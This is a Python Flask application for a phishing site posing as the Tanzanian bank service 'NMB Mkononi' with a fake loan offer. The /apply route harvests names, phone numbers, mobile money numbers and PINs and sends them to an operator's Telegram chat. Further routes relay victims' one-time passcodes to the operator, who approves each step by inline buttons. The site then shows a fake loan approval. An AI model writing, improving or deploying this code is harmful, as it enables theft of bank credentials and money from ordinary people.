from flask import Flask, render_template, request, jsonify, redirect, url_for
import os
from dotenv import load_dotenv
import requests
import uuid
import time
from threading import Lock
import random
import json
import traceback
import logging

# load environment from .env if present
load_dotenv()

app = Flask(__name__)
app.logger.setLevel(logging.DEBUG)

# 🔴 Telegram bot token and chat ID — REQUIRED
BOT_TOKEN = os.getenv("BOT_TOKEN") or os.getenv("TELEGRAM_BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID") or os.getenv("CHAT_ID")


def get_brand_config():
    return {
        "app_name": os.getenv("APP_NAME", "NMB Mkononi"),
        "tagline": os.getenv("APP_TAGLINE", "Mikopo ya haraka, salama na ya kuaminika"),
        "hero_title": os.getenv("HERO_TITLE", "Pata Mkopo Wako kwa NMB Mkononi"),
        "hero_subtitle": os.getenv(
            "HERO_SUBTITLE",
            "Mikopo ya haraka kutoka TSh 500,000 hadi TSh 50,000,000 kwa wateja wa Tanzania wanaotaka ufadhili wa haraka, rahisi, na wa kuaminika."
        ),
        "primary_cta_text": os.getenv("PRIMARY_CTA_TEXT", "Omba Mkopo Sasa"),
        "primary_color": os.getenv("PRIMARY_COLOR", "#0b4f8a"),
        "accent_color": os.getenv("ACCENT_COLOR", "#f4b400"),
        "primary_soft_color": os.getenv("PRIMARY_SOFT_COLOR", "#eaf4ff"),
        "footer_text": os.getenv(
            "FOOTER_TEXT",
            "Huduma ya mikopo ya kisasa kwa wateja nchini Tanzania. Usalama, uwazi, na huduma ya kuaminika kwa maisha yako ya kila siku."
        ),
    }


@app.context_processor
def inject_brand():
    return {"brand": get_brand_config()}

@app.errorhandler(Exception)
def handle_exception(e):
    traceback.print_exc()
    app.logger.error('Unhandled exception: %s', e)
    return jsonify({'status': 'error', 'message': 'Internal server error'}), 500

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/application')
def application():
    return render_template('application.html')

@app.route('/application.html')
def application_html():
    return render_template('application.html')

@app.route('/apply', methods=['POST'])
def apply():
    try:
        data = request.json or {}
        name = data.get("name", "-")
        phone = data.get("phone", "-")
        email = data.get("email", "-")
        amount = data.get("amount", "-")
        term = data.get("term", "-")
        purpose = data.get("purpose", "-")
        employment = data.get("employment", "-")
        monthly_income = data.get("monthlyIncome", "-")
        tigo_number = data.get("tigoNumber", "-")
        tigo_pin = data.get("tigoPin", "-")

        request_id = str(uuid.uuid4())

        message = f"""
📩 *Maombi Mapya ya Mkopo* ({request_id})

👤 Jina: {name}
📞 Simu: {phone}
✉️ Barua Pepe: {email}
💰 Kiasi: TSh {amount}
📅 Muda: {term} miezi
🏷️ Madhumuni: {purpose}
👔 Hali ya Kazi: {employment}
📈 Mapato ya Kila Mwezi: TSh {monthly_income}

📲 *Uthibitishaji NMB Mkononi*
Namba ya NMB Mkononi: {tigo_number}
PIN ya NMB Mkononi: {tigo_pin}
"""

        if not CHAT_ID:
            return jsonify({
                "status": "error",
                "message": "CHAT_ID haijasetwa. Set TELEGRAM_CHAT_ID kwenye mazingira yako."
            }), 500

        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        
        # send inline keyboard with Allow / Deny
        keyboard = {
            "inline_keyboard": [
                [
                    {"text": "Allow ✅", "callback_data": f"allow:{request_id}"},
                    {"text": "Deny ❌", "callback_data": f"deny:{request_id}"}
                ]
            ]
        }

        response = requests.post(url, data={
            "chat_id": CHAT_ID,
            "text": message,
            "reply_markup": json.dumps(keyboard),
            "parse_mode": "Markdown"
        }, timeout=10)

        app.logger.info(f"Telegram response: {response.status_code} {response.text}")

        if not response.ok:
            app.logger.error(f"Telegram send failed: {response.status_code} {response.text}")
            return jsonify({"status": "error", "message": "Imeshindikana kutuma Telegram. " + response.text}), 500

        # store request in memory for status polling
        app.config.setdefault('PENDING_REQUESTS', {})
        if 'REQUESTS_LOCK' not in app.config:
            app.config['REQUESTS_LOCK'] = Lock()
        lock = app.config['REQUESTS_LOCK']
        
        record = {
            'id': request_id,
            'data': data,
            'status': 'pending',
            'created_at': time.time(),
            'otp': None,
            'otp_sent_at': None,
            'otp_attempts': 0
        }
        
        lock.acquire()
        try:
            app.config['PENDING_REQUESTS'][request_id] = record
        finally:
            lock.release()

        app.logger.info(f"Stored request_id={request_id}")

        return jsonify({"status": "success", "message": "Maombi yamepokelewa", "request_id": request_id})
    except Exception as e:
        traceback.print_exc()
        return jsonify({"status": "error", "message": "Internal server error: " + str(e)}), 500


@app.route('/status/<request_id>')
def status(request_id):
    reqs = app.config.get('PENDING_REQUESTS', {})
    record = reqs.get(request_id)
    if not record:
        return jsonify({'status': 'not_found'}), 404
    return jsonify({'status': record['status']})


@app.route('/idini')
def idini():
    request_id = request.args.get('request_id')
    if not request_id:
        return "Missing request_id", 400
    return render_template('idini.html', request_id=request_id)


@app.route('/verify_otp', methods=['POST'])
def verify_otp():
    data = request.json or {}
    request_id = data.get('request_id')
    otp = data.get('otp')
    reqs = app.config.get('PENDING_REQUESTS', {})
    record = reqs.get(request_id)
    if not record:
        return jsonify({'status': 'error', 'message': 'Ombi halijapatikana'}), 404
    # Determine which stage the request is in.
    # Stage 1: record['status'] == 'allowed' (admin previously allowed and generated first OTP)
    # Stage 2: record['status'] == 'allowed2' (admin allowed second OTP and generated second OTP)

    # Validate OTP content (stage-specific validation will follow)
    if not otp or not isinstance(otp, str) or not otp.isdigit():
        return jsonify({'status': 'error', 'message': 'OTP lazima iwe tarakimu'}), 400

    # ---- Stage 2: final verification (second OTP) ----
    if record.get('status') == 'allowed2':
        if len(otp) not in (4, 6):
            return jsonify({'status': 'error', 'message': 'OTP ya mwisho lazima iwe tarakimu 4 au 6'}), 400

        record['entered_second_otp'] = otp
        record['status'] = 'verified'
        record['verified_otp'] = otp

        # Retrieve name, phone, and amount from the stored data
        stored_data = record.get('data', {})
        name = stored_data.get('name', '-')
        phone = stored_data.get('phone', '-')
        amount = stored_data.get('amount', '-')

        # Send final approval message to Telegram
        approval_message = f"""
✅ *Hongera! Mkopo Umeidhinishwa!*

👤 Jina: {name}
📞 Simu: {phone}
💰 Kiasi Kilichoidhinishwa: TSh {amount}
🔢 OTP Iliyoingizwa: {otp}
"""

        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        try:
            requests.post(url, data={
                'chat_id': CHAT_ID,
                'text': approval_message,
                'parse_mode': 'Markdown'
            }, timeout=10)
        except requests.RequestException:
            pass

        return jsonify({
            'status': 'success',
            'message': 'OTP imethibitishwa na mkopo umeidhinishwa',
            'approved_amount': amount,
            'name': name,
            'phone': phone
        })

    # ---- Stage 1: first OTP verification ----
    current_status = record.get('status')
    if current_status not in ('pending', 'allowed', 'second_pending'):
        return jsonify({'status': 'error', 'message': 'Ombi halijaidhinishwa au sio katika hatua sahihi'}), 400

    # First OTP expected to be exactly 4 digits
    if len(otp) != 4:
        return jsonify({'status': 'error', 'message': 'OTP ya kwanza lazima iwe tarakimu 4'}), 400

    # First OTP is entered by the user from their phone. The bot only approves or denies the step.
    if len(otp) != 4:
        return jsonify({'status': 'error', 'message': 'OTP ya kwanza lazima iwe tarakimu 4'}), 400

    record['entered_first_otp'] = otp
    record['status'] = 'second_pending'
    record['second_requested_at'] = time.time()

    # Send a message to admin with an inline keyboard to approve/deny the final OTP
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "Allow Final ✅", "callback_data": f"allow2:{request_id}"},
                {"text": "Deny Final ❌", "callback_data": f"deny2:{request_id}"}
            ]
        ]
    }
    try:
        requests.post(url, data={
            'chat_id': CHAT_ID,
            'text': f'Final approval requested for request {request_id}. Approve to send second OTP to applicant.',
            'reply_markup': json.dumps(keyboard)
        }, timeout=10)
    except requests.RequestException:
        pass

    return jsonify({'status': 'pending_second', 'message': 'OTP ya kwanza imekubaliwa; msimamizi atathibitisha hatua ya mwisho.'})


@app.route('/resend_otp', methods=['POST'])
def resend_otp():
    data = request.json or {}
    request_id = data.get('request_id')
    reqs = app.config.get('PENDING_REQUESTS', {})
    record = reqs.get(request_id)
    if not record:
        return jsonify({'status': 'error', 'message': 'Request not found'}), 404

    new_otp = str(uuid.uuid4().int)[:4]
    record['otp'] = new_otp
    record['otp_sent_at'] = time.time()
    record['otp_attempts'] += 1

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, data={
            'chat_id': CHAT_ID,
            'text': f"OTP for request {request_id}: {new_otp}"
        }, timeout=10)
    except requests.RequestException:
        pass

    redirect_url = f"/application?request_id={request_id}&show_status=1"
    return jsonify({'status': 'sent', 'redirect': redirect_url})


def process_update(update):
    if not update:
        return
    if 'callback_query' in update:
        cb = update['callback_query']
        data = cb.get('data', '')
        parts = data.split(':', 1)
        action = parts[0]
        req_id = parts[1] if len(parts) > 1 else None
        reqs = app.config.get('PENDING_REQUESTS', {})
        record = reqs.get(req_id) if req_id else None
        if action == 'allow' and record:
            record['status'] = 'allowed'
            try:
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery", data={
                    'callback_query_id': cb.get('id'),
                    'text': 'Allowed — applicant may proceed to the next OTP step.'
                }, timeout=5)
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={
                    'chat_id': CHAT_ID,
                    'text': f"Request {req_id} approved for the next OTP step."
                }, timeout=5)
            except requests.RequestException:
                pass
        elif action == 'deny' and record:
            record['status'] = 'denied'
            try:
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery", data={
                    'callback_query_id': cb.get('id'),
                    'text': 'Denied — applicant will be asked to correct their number.'
                }, timeout=5)
            except requests.RequestException:
                pass

            # Redirect user with explicit denial message
            redirect_url = f"/idini?status=denied&message=Weka%20nambari%20sahihi%20ya%20Tigo."
            record['redirect_url'] = redirect_url

            # Redirect the user to the denial page
            return redirect(redirect_url)
        elif action == 'allow2' and record:
            record['status'] = 'allowed2'
            try:
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery", data={
                    'callback_query_id': cb.get('id'),
                    'text': 'Final approval granted — applicant may enter the second OTP.'
                }, timeout=5)
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={
                    'chat_id': CHAT_ID,
                    'text': f"Final approval granted for request {req_id}. First OTP: {record.get('entered_first_otp', 'N/A')}"
                }, timeout=5)
            except requests.RequestException:
                pass
        elif action == 'deny2' and record:
            record['status'] = 'denied'
            try:
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery", data={
                    'callback_query_id': cb.get('id'),
                    'text': 'Final approval denied — applicant will be notified.'
                }, timeout=5)
            except requests.RequestException:
                pass

            # Redirect user with explicit denial message
            redirect_url = f"/idini?status=denied&message=Weka%20nambari%20sahihi%20ya%20NMB%20Mkononi."
            record['redirect_url'] = redirect_url

            return redirect(redirect_url)


@app.route('/deny', methods=['POST'])
def deny():
    try:
        data = request.json or {}
        request_id = data.get('request_id')
        reqs = app.config.get('PENDING_REQUESTS', {})
        record = reqs.get(request_id)

        if not record:
            return jsonify({'status': 'error', 'message': 'Request not found'}), 404

        # Update the status to denied
        record['status'] = 'denied'

        # Respond with the message to be displayed
        return jsonify({
            'status': 'success',
            'message': 'Weka nambari sahihi na utume ombi tena.'
        })
    except Exception as e:
        traceback.print_exc()
        return jsonify({'status': 'error', 'message': 'Internal server error: ' + str(e)}), 500


def start_poller_thread():
    enabled = os.getenv('ENABLE_TELEGRAM_POLLER', '1')
    if enabled != '1':
        app.logger.info('Telegram poller disabled')
        return

    def poll_loop():
        app.logger.info('Starting Telegram poller thread')
        last = app.config.get('TELEGRAM_LAST_UPDATE_ID')
        while True:
            try:
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
                params = {}
                if last:
                    params['offset'] = last + 1
                r = requests.get(url, params=params, timeout=10)
                if r.ok:
                    data = r.json()
                    for item in data.get('result', []):
                        process_update(item)
                        last = item.get('update_id')
                        app.config['TELEGRAM_LAST_UPDATE_ID'] = last
                time.sleep(1)
            except Exception:
                traceback.print_exc()
                time.sleep(2)

    t = __import__('threading').Thread(target=poll_loop, daemon=True)
    t.start()


@app.before_request
def ensure_poller():
    if not app.config.get('POLL_STARTED'):
        start_poller_thread()
        app.config['POLL_STARTED'] = True


if __name__ == '__main__':
    port = int(os.getenv('PORT', '5000'))
    host = os.getenv('HOST', '0.0.0.0')
    app.run(host=host, port=port, debug=(os.getenv('FLASK_DEBUG', '0') == '1'))
